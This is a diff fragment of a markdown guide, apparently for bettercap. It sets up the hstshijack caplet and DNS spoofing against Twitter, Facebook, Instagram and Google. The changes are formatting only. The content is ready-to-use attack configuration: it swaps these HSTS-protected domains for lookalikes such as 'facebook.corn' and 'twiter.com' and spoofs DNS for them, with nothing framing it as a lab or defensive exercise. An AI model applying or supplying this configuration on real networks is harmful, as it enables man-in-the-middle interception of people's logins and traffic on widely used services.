@@ -18,13 +18,11 @@
 3. Edit hstshijack config file to bypass specific sites configured with HSTS.
    1. `nano /usr/local/share/bettercap/caplets/hstshijack/hstshijack.cap `
    2. Targets and replacements could look like this… (customize to your liking)
-      1. 
-    `
+      `
     set hstshijack.targets         twitter.com,*.twitter.com,facebook.com,*.facebook.com,instagram.com,*.instagram.com,google.com,*.google.com, gstatic.com, *.gstatic.com
     set hstshijack.replacements    twiter.com,*.twiter.com,facebook.corn,*.facebook.corn,instagam.com,*.instagam.com,google.corn,*.google.corn,gstatic.corn,*.gstatic.corn
     `
-   3. dns.spoof.domains could look like this... (customize to your liking)
-      1. 
+   3. dns.spoof.domains could look like this... (customize to your liking) 
     `
     dns.spoof.domains
     set dns.spoof.domains  twiter.com,*.twiter.com,facebook.corn,*.facebook.corn,instagam.com,*.instagam.com,google.corn,*.google.corn,gstatic.corn,*.gstatic.corn
